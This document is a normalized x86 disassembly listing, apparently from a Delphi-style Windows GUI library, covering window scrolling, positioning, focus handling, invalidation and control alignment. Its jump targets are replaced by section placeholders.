test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44c074
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44c4a8
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_44f45c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_4188fc
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_418790
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41891c
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4188a0
call sub_44f7b4
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4188a0
call sub_44f7b4
sub_44f534
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_44f45c
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_44f594
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_44f7b4
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_44f7b4
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
test eax eax
jne r-xdata
sub_44f5f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44a180
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
mov eax ebx
call sub_44c4e4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c4a8
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44c4a8
test [ eax + 0x52 ] 0x4
je r-xdata
sub_44f6bc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_448954
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_44f6f4
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_45fd40
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_44f734
push ebx
mov ebx eax
mov eax ebx
call sub_45fd40
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_463aac
pop ebx
retn
mov eax ebx
call sub_45fd68
mov eax ebx
call sub_44f7b4
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_44f76c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f790
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_44f790
sub_44f7c8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_417264
mov eax edi
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44c4a8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_44f85c
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_44f7b4
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_44f894
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44fab8
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f7b4
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403564
sub_44f950
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_4188fc
pop esi
pop ebx
retn
sub_44f974
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f950
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_418790
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41891c
sub_44f9e8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_44fab8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44a180
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44fa48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44faac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fab3
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403564
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405b1c
sub_44fac4
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4485e0
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44fb7c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4188a0
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_418744
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403564
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_44fbdc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44fcd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403564
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fcd9
mov eax [ ebp - 0x14 ]
call sub_403368
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4188fc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4188a0
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403564
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_44fce8
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_44fbdc
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44fd14
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45fd40
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44fbdc
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44fbdc
mov edx eax
mov eax esi
call sub_4639ac
sub_44fd58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44fda0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44f45c
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_449224
sub_44fde8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44fe6c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_44fab8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_44c4e4
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_45022e
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_44c4e4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_44fde8
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44c4a8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_450248
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44fe6c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44a01c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_450284
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44aea0
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4488f4
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_4502cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b0c0
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4502fc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_44c04c
xor ecx ecx
push ebp
push sub_45042b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c4e4
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450432
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
